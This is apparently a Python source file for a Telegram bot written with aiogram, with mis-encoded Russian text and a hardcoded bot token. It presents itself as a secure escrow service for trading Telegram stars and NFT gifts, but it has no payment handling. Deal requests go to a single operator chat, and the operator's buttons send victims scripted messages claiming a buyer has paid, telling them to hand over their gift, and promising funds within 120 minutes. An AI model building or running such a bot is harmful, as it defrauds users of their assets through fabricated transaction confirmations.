from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor

API_TOKEN = '7656336716:AAGmlNwWpYk6CUYTaW6x1BUBO2OXiU-BOT0'  # Replace with your actual token
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
activeConnect = False
aplata = False
@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    user_id = message.from_user.username
    chatId = message.from_user.id
    text = f"–ü—Ä–∏–≤–µ—Ç {user_id} ! ‚ö°Ô∏è\n –í –¥–∞–Ω–Ω–æ–º –±–æ—Ç–µ —Ç—ã —Å–º–æ–∂–µ—à—å —Å –∞–±—Å–æ–ª—é—Ç–Ω–æ–π –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç—å—é –ø—Ä–æ–¥–∞—Ç—å –∏–ª–∏ –∫—É–ø–∏—Ç—å —Å–µ–±–µ –∑–≤—ë–∑–¥—ã –∏–ª–∏ NFT –ø–æ–¥–∞—Ä–∫–∏. –ö–æ–º–∏—Å—Å–∏—è –≤–∑–∏–º–∞–µ—Ç—Å—è –≤—Å–µ–≥–æ –≤ 0.1%. –ü—Ä–∏–Ω–∏–º–∞—Ç—å –º–æ–∂–Ω–æ –Ω–∞: –ö–∞—Ä—Ç—É –±–∞–Ω–∫–∞, tonkeeper, binance, CryptoBot"

    # –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã —Å –∏–Ω–ª–∞–π–Ω –∫–Ω–æ–ø–∫–∞–º–∏ –Ω–∞ –æ–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–µ
    keyboard = InlineKeyboardMarkup(row_width=3)  # 2 buttons per row
    keyboard.add(
        InlineKeyboardButton(text="–ü–û–ú–û–©–¨", callback_data="button_click"),
        InlineKeyboardButton(text="–ù–∞—à —á–∞—Ç üí¨", url="https://t.me/chatgiftnft"),
        InlineKeyboardButton(text="–í–´–í–û–î –î–ï–ù–ï–ì üí∏", callback_data="withdraw"),
        InlineKeyboardButton(text="–°–û–ó–î–ê–¢–¨ –°–î–ï–õ–ö–£ ‚ö°Ô∏è", callback_data="new"),
    )
    await bot.send_photo(chat_id=chatId, photo="https://hooks.pro/media/2025/02/03/bot826197106/file-Z6DGHwOnkj.jpg")
    # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–∞–º–∏
    await message.answer(text, reply_markup=keyboard)
@dp.callback_query_handler(lambda c: c.data == 'withdraw')
async def process_withdraw_button(callback_query: types.CallbackQuery):
    # Message to send when the button is pressed
    help_text = "–í–∞—à –±–∞–ª–∞–Ω—Å: 0.0$. –í—ã–≤–æ–¥ –¥–æ—Å—Ç—É–ø–µ–Ω —Å: 1$ (–í—ã–≤–æ–¥–∏—Ç—å –º–æ–∂–Ω–æ –∫–∞–∫ –∏ –Ω–∞ –∫–∞—Ä—Ç—É –ª—é–±—ã—Ö —Å—Ç—Ä–∞–Ω, —Ç–∞–∫ –∏ –Ω–∞ –∫—Ä–∏–ø—Ç–æ–≤–∞–ª—é—Ç—É)"

    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer(help_text)
 


@dp.callback_query_handler(lambda c: c.data == 'new')
async def process_withdraw_button(callback_query: types.CallbackQuery):
    global activeConnect
    help_text = "–í–≤–µ–¥–∏—Ç–µ @username –∏–ª–∏ id —á–µ–ª–æ–≤–µ–∫–∞ —Å –∫–æ—Ç–æ—Ä—ã–º —Ö–æ—Ç–∏—Ç–µ —Å–æ–∑–¥–∞—Ç—å —Å–¥–µ–ª–∫—É"
    activeConnect = True
    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer(help_text)
    
    
@dp.message_handler()
async def echo_message(message: types.Message):
    global activeConnect
    global aplata
    if message.text:
        
        # –û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ —Å–æ–æ–±—â–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        if(activeConnect):
            await message.reply(f"–£—Å–ø–µ—à–Ω–æ ‚úÖ\n–í–∞—à–∞ —Å–¥–µ–ª–∫–∞ –±—ã–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –∫ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é {message.text}. –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω –≤ –±–æ—Ç–µ, –æ–∂–∏–¥–∞–π—Ç–µ –ø—Ä–∏–Ω—è—Ç–∏—è –∏–ª–∏ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∏—è –≤–∞—à–µ–π —Å–¥–µ–ª–∫–∏! ‚ö†Ô∏è")

            username = message.from_user.username or f"id{message.from_user.id}"

            # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–Ω–æ–ø–∫–æ–π "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Å–¥–µ–ª–∫—É"
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Å–¥–µ–ª–∫—É",callback_data=f"confirm_deal:{message.from_user.id}")
            )

            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–æ–π
            await bot.send_message(
                chat_id=1688694245,
                text="@" + username + f"\n–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —Ö–æ—á–µ—Ç —Å–æ–∑–¥–∞—Ç—å —Å –≤–∞–º–∏ —Å–¥–µ–ª–∫—É. inqy kirec({message.text}) –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –Ω–∏–∂–µ:",
                reply_markup=keyboard
            )
           
            activeConnect = False;
        elif(aplata):
            await message.reply("–¶–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ—Å—Ç–∞–≤–ª–µ–Ω–∞! –û–∂–∏–¥–∞–π—Ç–µ –æ–ø–ª–∞—Ç—ã —Å–¥–µ–ª–∫–∏")
            aplata = False

            username = message.from_user.username or f"id{message.from_user.id}"

            # –ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–Ω–æ–ø–∫–æ–π "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å —Å–¥–µ–ª–∫—É"
            keyboard = InlineKeyboardMarkup().add(
                InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å oplatu",callback_data=f"confirm_oplata:{message.from_user.id}"),
                InlineKeyboardButton("‚úÖ verjnakan",callback_data=f"verjnakan:{message.from_user.id}"),
            )

            # –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–Ω–æ–ø–∫–æ–π
            await bot.send_message(
                chat_id=1688694245,
                text="@" + username + f"\npogverdit oplatu. inqy kirec({message.text}) –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç–µ –Ω–∏–∂–µ:",
                reply_markup=keyboard
            )
@dp.callback_query_handler(lambda c: c.data.startswith("confirm_deal:"))
async def confirm_deal(callback_query: types.CallbackQuery):
    global aplata
    await callback_query.answer()

    # –ü–∞—Ä—Å–∏–º user_id –∏–∑ callback_data
    data = callback_query.data  # –Ω–∞–ø—Ä–∏–º–µ—Ä "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # –∏–∑–≤–ª–µ–∫–∞–µ–º ID

    # –£–≤–µ–¥–æ–º–ª—è–µ–º —Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–≤–∞–ª —Å–¥–µ–ª–∫—É
    await bot.send_message(chat_id=user_id, text="–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å @Himan1008 –ø—Ä–∏–Ω—è–ª –≤–∞—à—É —Å–¥–µ–ª–∫—É! –û–∂–∏–¥–∞–π—Ç–µ –æ–ø–ª–∞—Ç—ã \nId —Å–¥–µ–ª–∫–∏: 1596654179 - 972\n–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –¥–ª—è –æ–ø–ª–∞—Ç—ã –≤ –î–æ–ª–ª–∞—Ä–∞—Ö $, Toncoin T –∏–ª–∏ –†—É–±–ª—è—Ö ‚ÇΩ –∏–ª–∏ –ó–≤–µ–∑–¥–∞—Ö ‚≠êÔ∏è")
    aplata = True

@dp.callback_query_handler(lambda c: c.data.startswith("confirm_oplata:"))
async def confirm_oplata(callback_query: types.CallbackQuery):
 
    await callback_query.answer()

    # –ü–∞—Ä—Å–∏–º user_id –∏–∑ callback_data
    data = callback_query.data  # –Ω–∞–ø—Ä–∏–º–µ—Ä "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # –∏–∑–≤–ª–µ–∫–∞–µ–º ID
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å",callback_data="txt")
    )
    # –£–≤–µ–¥–æ–º–ª—è–µ–º —Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–≤–∞–ª —Å–¥–µ–ª–∫—É
    await bot.send_message(chat_id=user_id, text="@Himan1008 –æ–ø–ª–∞—Ç–∏–ª —Å–¥–µ–ª–∫—É! –î–µ–Ω—å–≥–∏ –¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã –≤ –±–æ—Ç. –ü–µ—Ä–µ–¥–∞–π—Ç–µ –ø–æ–¥–∞—Ä–æ–∫/–∑–≤–µ–∑–¥—ã  –ø–∞—Ä—Ç–Ω–µ—Ä—É –∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –ü–û–î–¢–í–ï–†–î–ò–¢–¨",  reply_markup=keyboard)
@dp.callback_query_handler(lambda c: c.data.startswith("verjnakan:"))
async def verjnakan(callback_query: types.CallbackQuery):

    await callback_query.answer()

    # –ü–∞—Ä—Å–∏–º user_id –∏–∑ callback_data
    data = callback_query.data  # –Ω–∞–ø—Ä–∏–º–µ—Ä "confirm_deal:123456789"
    user_id = int(data.split(":")[1])  # –∏–∑–≤–ª–µ–∫–∞–µ–º ID
   
    # –£–≤–µ–¥–æ–º–ª—è–µ–º —Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–∑–¥–∞–≤–∞–ª —Å–¥–µ–ª–∫—É
    await bot.send_message(chat_id=user_id, text="–°–¥–µ–ª–∫–∞ –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ–≤–µ–¥–µ–Ω–∞. –°—Ä–µ–¥—Å—Ç–≤–∞ –±—É–¥—É—Ç –∑–∞—á–∏—Å–ª–µ–Ω—ã –≤ —Ç–µ—á–µ–Ω–∏–∏ 120 –º–∏–Ω—É—Ç üïú. –£—Å–ø–µ—à–Ω—ã—Ö —Å–¥–µ–ª–æ–∫: 1")
@dp.callback_query_handler(lambda c: c.data == 'txt')
async def txt(callback_query: types.CallbackQuery):
  
    # Send the help message as a response to the callback query
    await callback_query.answer()  # Answer the callback to remove loading status
    await callback_query.message.answer("–í—ã –ø–æ–¥—Ç–≤–µ—Ä–¥–∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–æ–¥–∞—Ä–∫–∞! üéÅ\n\n–û–∂–∏–¥–∞–π—Ç–µ –ø–æ–∫–∞ –ø–∞—Ä—Ç–Ω–µ—Ä –ø—Ä–æ–≤–µ—Ä–∏—Ç –Ω–∞–ª–∏—á–∏–µ –ø–æ–¥–∞—Ä–∫–∞ –∏ –ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç –æ—Ç–ø—Ä–∞–≤–∫—É –¥–µ–Ω–µ–≥ —Å –±–∞–ª–∞–Ω—Å–∞ –±–æ—Ç–∞ –Ω–∞ –≤–∞—à –∫–æ—à–µ–ª–µ–∫")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
